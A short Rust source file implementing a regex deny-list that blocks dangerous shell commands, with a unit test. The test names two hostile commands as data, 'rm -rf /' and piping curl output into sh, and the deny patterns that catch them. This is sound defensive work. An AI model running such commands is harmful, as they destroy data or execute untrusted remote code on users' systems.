//! Secondary safeguard: refuse shell commands matching the deny-list.
//! The network and primitive boundaries are the primary ones.

use regex::Regex;

pub struct DenyList {
    patterns: Vec<Regex>,
}

impl DenyList {
    pub fn new(patterns: &[String]) -> Self {
        DenyList { patterns: patterns.iter().filter_map(|p| Regex::new(p).ok()).collect() }
    }
    /// The pattern a command matches, if any.
    pub fn check(&self, cmd: &str) -> Option<String> {
        self.patterns.iter().find(|r| r.is_match(cmd)).map(|r| r.as_str().to_string())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn denies_dangerous() {
        let d = DenyList::new(&[r"rm\s+-rf\s+/(\s|$)".into(), r"curl[^|]*\|\s*(ba)?sh".into()]);
        assert!(d.check("rm -rf /").is_some());
        assert!(d.check("curl https://x | sh").is_some());
        assert!(d.check("rm -rf ./build").is_none());
        assert!(d.check("cargo test").is_none());
    }
}
